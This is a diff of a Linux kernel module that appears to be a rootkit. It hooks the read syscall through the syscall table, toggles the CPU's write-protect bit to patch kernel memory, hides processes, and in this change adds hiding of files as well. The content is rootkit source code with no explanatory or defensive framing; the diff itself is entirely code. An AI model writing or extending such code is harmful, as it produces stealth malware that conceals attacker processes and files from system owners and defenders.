@@ -5,12 +5,13 @@
 #include <asm/page.h>
 #include <asm/pgtable.h>
 #include <asm/unistd.h>
-#include <asm/processor-flags.h>
 #include <linux/string.h>
 #include <linux/slab.h>
 
 #include "process_hiding.h"
+#include "file_hiding.h"
 #include "sysmap.h"
+#include "hooking.h"
 
 MODULE_LICENSE("GPL");
 
@@ -22,19 +23,11 @@ MODULE_DESCRIPTION(DRIVER_DESC);
 
 #define HOOK_READ 0 
 
-void ** syscall_table = (void * *) sys_call_table_R;
 ssize_t (*orig_sys_read)(int fd, void *buf, size_t count);
 char * buffer;
 int r_count=0;
 
 
-inline void disable_wp(void){
-	write_cr0(read_cr0() & ~0x00010000);
-}
-
-inline void enable_wp(void){
-	write_cr0(read_cr0() | 0x00010000);
-}
 
 static ssize_t my_read(int fd, void *buf, size_t count){
 	static int buf_size = 0;
@@ -62,6 +55,7 @@ static int __init mod_init(void)
   disable_wp(); 
   
   hide_processes();
+  hide_files();
   orig_sys_read = syscall_table[__NR_read];
   
   //Disable nasty compiler warnings
@@ -83,6 +77,7 @@ static void __exit mod_exit(void)
   enable_wp();
   kfree(buffer);
   unhide_processes();
+  unhide_files();
   while(r_count > 0){ //hack to unblock read
 	printk(KERN_INFO "\n");
   }  
